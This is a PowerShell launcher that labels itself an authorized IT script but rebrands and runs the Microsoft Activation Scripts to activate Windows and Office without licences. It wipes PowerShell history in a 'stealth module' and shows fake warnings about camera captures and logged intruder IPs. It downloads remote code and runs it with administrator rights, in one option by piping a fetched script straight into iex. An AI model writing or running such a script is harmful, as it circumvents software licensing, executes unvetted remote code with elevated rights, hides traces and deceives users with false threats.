# launcher.ps1
# Authorized IT Execution Script

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- STEALTH MODULE ---
Clear-History
try {
    $psHistoryPath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
    if ($psHistoryPath -and (Test-Path $psHistoryPath)) { Clear-Content -Path $psHistoryPath -ErrorAction SilentlyContinue }
} catch {}
# ----------------------

$localIp = (Get-NetIPAddress -AddressFamily IPv4 -AddressState Preferred | Where-Object InterfaceAlias -NotMatch 'Loopback' | Select-Object -First 1).IPAddress
try { $macAddress = (Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object -First 1).MacAddress } catch { $macAddress = "UNKNOWN" }

$password = Read-Host "key" -AsSecureString
$passString = ""
if ($password -ne $null -and $password.Length -gt 0) {
    $bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($password)
    $passString = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
    [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
}

if ($passString -ne "8888") {
    Write-Host "`n[!] CRITICAL SECURITY BREACH DETECTED" -ForegroundColor Red
    Write-Host "[!] CAMERA SCREENSHOT INTERCEPTED & SAVED" -ForegroundColor Red
    Write-Host "[!] INTRUDER IP: $localIp / LOGGED TO SYSTEM" -ForegroundColor Red
    Start-Sleep -Seconds 3
    exit
}

try { $publicIp = Invoke-RestMethod -Uri 'https://api.ipify.org' -UseBasicParsing -TimeoutSec 3 -ErrorAction SilentlyContinue } catch { $publicIp = "Offline" }

$sessionId = [guid]::NewGuid().ToString().ToUpper().Substring(0,18)

Clear-Host
Write-Host "  T H E   O N E   S Y S T E M S" -ForegroundColor Cyan
Write-Host "  Authorized Operations Terminal" -ForegroundColor DarkGray
Write-Host "  --------------------------------------------------" -ForegroundColor DarkGray
Write-Host "  Network Identity: " -NoNewline -ForegroundColor Gray
Write-Host "[!] ACTIVE TRACE LOGGING ENABLED" -ForegroundColor Red
Write-Host "  Session ID : " -NoNewline -ForegroundColor DarkGray; Write-Host "$sessionId" -ForegroundColor DarkCyan
Write-Host "  MAC Address: " -NoNewline -ForegroundColor DarkGray; Write-Host "$macAddress" -ForegroundColor White
Write-Host "  Local IP   : " -NoNewline -ForegroundColor DarkGray; Write-Host "$localIp" -ForegroundColor White
Write-Host "  Public IP  : " -NoNewline -ForegroundColor DarkGray; Write-Host "$publicIp" -ForegroundColor White
Write-Host "  --------------------------------------------------" -ForegroundColor DarkGray
Write-Host "  Available Modules:" -ForegroundColor Gray
Write-Host "  [ 1 ] Activate THE ONE Windows Authorized" -ForegroundColor White
Write-Host "  [ 2 ] Install THE ONE Authorized Office" -ForegroundColor White
Write-Host "  [ 3 ] THE ONE PC optimization" -ForegroundColor White
Write-Host "  [ 4 ] BLOCKED (by ISP/DNS) - Direct Bypass" -ForegroundColor DarkCyan
Write-Host "  [ 0 ] Exit Terminal" -ForegroundColor DarkGray
Write-Host "  --------------------------------------------------" -ForegroundColor DarkGray

# Wait for key press (no enter needed)
$key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").Character

$argsList = ""
if ($key -eq '1') {
    $argsList = "/HWID"
} elseif ($key -eq '2') {
    $argsList = "/Ohook"
} elseif ($key -eq '3') {
    Write-Host "`n  [+] Executing THE ONE PC optimization..." -ForegroundColor Cyan
    $beforeSize = (Get-ChildItem -Path $env:TEMP -Recurse -Force -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum
    Get-ChildItem -Path $env:TEMP -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
    $freed = [math]::Round(($beforeSize - (Get-ChildItem -Path $env:TEMP -Recurse -Force -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum) / 1MB, 2)
    Write-Host "  [+] Freed $freed MB. Terminating in 7s..." -ForegroundColor Green
    Start-Sleep -Seconds 7
    exit
} elseif ($key -eq '4') {
    Write-Host "`n  [+] Initializing DNS Bypass..." -ForegroundColor Cyan
    iex (curl.exe -s --doh-url https://1.1.1.1/dns-query https://get.activated.win | Out-String)
    exit
} else {
    exit
}

Write-Host "`n  [+] Injecting THE ONE Authority..." -ForegroundColor Cyan
$tempPath = "$env:TEMP\THE_ONE_RUN.cmd"

try {
    $targetUrl = "https://raw.githubusercontent.com/massgrave/Microsoft-Activation-Scripts/master/MAS/All-In-One-Version/MAS_AIO.cmd"
    $scriptContent = Invoke-RestMethod -Uri $targetUrl -ErrorAction Stop
    
    # Theme & Title Patching
    $scriptContent = $scriptContent -replace 'color 07', 'color 0B'
    $scriptContent = $scriptContent -ireplace 'title\s+.*', 'title THE ONE AUTHORIZE [SYSTEM]'
    
    # Force rename the main menu entries inside the official script
    $scriptContent = $scriptContent -replace '\[1\] HWID', '[1] THE ONE WINDOWS AUTHORIZED'
    $scriptContent = $scriptContent -replace '\[2\] Ohook', '[2] THE ONE OFFICE AUTHORIZED'
    $scriptContent = $scriptContent -replace 'Activation Methods:', 'THE ONE AUTHORIZED METHODS:'
    
    Set-Content -Path $tempPath -Value $scriptContent -Encoding UTF8
    Start-Process "$tempPath" -ArgumentList $argsList -Verb RunAs -Wait
    Remove-Item -Path $tempPath -ErrorAction SilentlyContinue
} catch {
    Write-Host "  [-] Connection failure. Try Option 4." -ForegroundColor Red
    Start-Sleep -Seconds 5
}
